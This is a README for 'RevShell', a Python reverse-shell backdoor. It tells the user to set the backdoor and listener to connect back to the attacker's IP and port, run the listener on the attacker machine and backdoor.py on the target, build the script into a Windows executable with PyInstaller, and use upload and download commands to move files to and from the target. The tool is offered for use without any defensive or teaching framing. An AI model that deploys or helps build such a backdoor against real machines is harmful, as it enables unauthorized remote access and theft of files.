# RevShell
A tool to grant access to a target machine via a reverse shell

## Instructions
Editing the client.py file 

Fill in the host in
```
backdoor .py
my_backdoor = Backdoor("127.0.0.1", 4444)
# you need to fill in the destination (Your own) IP address here and a port of your choice
# the backdoor will connect back to the provided IP

listener_single_client.py
my_listener = Listener("127.0.0.1", 4444)
# you need to fill in the destination (Your own) IP address here and a port of your choice 
# listener will listen for connections coming to the provided IP
```
Run the server script on the attacker machine using

    python3 listener_single_client.py
    
Run the client script on the target machine

    python3 backdoor.py

## Creating Windows executable (Pyinstaller Method)

install and Use Pyinstaller
```
pip3 install pyinstaller
pyinstaller --onefile listener_single_client.py
```
The executable will be found in the ```dist``` folder
    
## Using the scripts

Run the listener first to listen to incoming connections

Once the backdoor sends a connection request, you'll get a backdoor

#### Special Commands
```
upload - will upload a file from your device to target device
download - will download a file from target device to your device
quit / exit - any of these commands will close the connection and exit the programs
```




